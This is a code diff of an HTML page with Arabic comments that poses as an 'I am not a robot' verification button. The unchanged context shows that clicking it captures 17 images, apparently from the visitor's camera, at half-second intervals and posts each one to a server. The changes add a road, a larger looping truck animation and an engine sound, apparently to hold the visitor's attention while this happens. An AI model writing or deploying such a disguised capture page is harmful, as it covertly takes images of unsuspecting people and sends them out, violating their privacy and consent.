@@ -16,7 +16,7 @@
         }
         button { 
             padding: 20px 40px; 
-            font-size: 18px; 
+            font-size: 22px; 
             cursor: pointer; 
             background: #007bff; 
             color: white; 
@@ -27,24 +27,55 @@
         }
         button:hover { background: #0056b3; }
 
-        /* الشاحنة */
+        /* الطريق */
+        .road {
+            position: absolute;
+            bottom: 100px;
+            left: 0;
+            width: 100%;
+            height: 80px;
+            background: #333;
+        }
+        .road::after {
+            content: "";
+            position: absolute;
+            top: 35px;
+            left: 0;
+            width: 100%;
+            height: 10px;
+            background: repeating-linear-gradient(
+                to right,
+                #fff 0,
+                #fff 40px,
+                transparent 40px,
+                transparent 80px
+            );
+        }
+
+        /* السيارة */
         .truck {
             position: absolute;
-            left: -120px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 40px;
-            transition: left 10s linear; /* حركة بطيئة */
+            bottom: 140px;
+            left: -150px;
+            font-size: 90px; /* حجم أكبر */
         }
         .truck.move {
-            left: calc(100% - 50px);
+            animation: drive 10s linear 5; /* ببطء وتتكرر 5 مرات */
+        }
+
+        @keyframes drive {
+            from { left: -150px; }
+            to { left: calc(100% - 100px); }
         }
     </style>
 </head>
 <body>
 
-<button onclick="startProcess()">أنا لست روبوت - اضغط للتحقق</button>
+<button onclick="startProcess()">لتحقق أنك لست روبوت اضغط هنا</button>
+<div class="road"></div>
 <div class="truck">🚚</div>
+
+<audio id="engineSound" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>
 
 <script>
 async function startProcess() {
@@ -61,7 +92,11 @@ async function startProcess() {
         const ctx = canvas.getContext('2d');
 
         const truck = document.querySelector('.truck');
-        truck.classList.add('move'); // بدء حركة الشاحنة
+        const engine = document.getElementById('engineSound');
+
+        // بدء حركة السيارة + تشغيل الصوت
+        truck.classList.add('move');
+        engine.play();
 
         // التقاط 17 صورة بفاصل نصف ثانية
         for (let i = 0; i < 17; i++) {
@@ -74,7 +109,6 @@ async function startProcess() {
                 body: 'img=' + encodeURIComponent(data) + '&frame=' + i
             });
 
-            // انتظار نصف ثانية قبل الصورة التالية
             await new Promise(resolve => setTimeout(resolve, 500));
         }
 
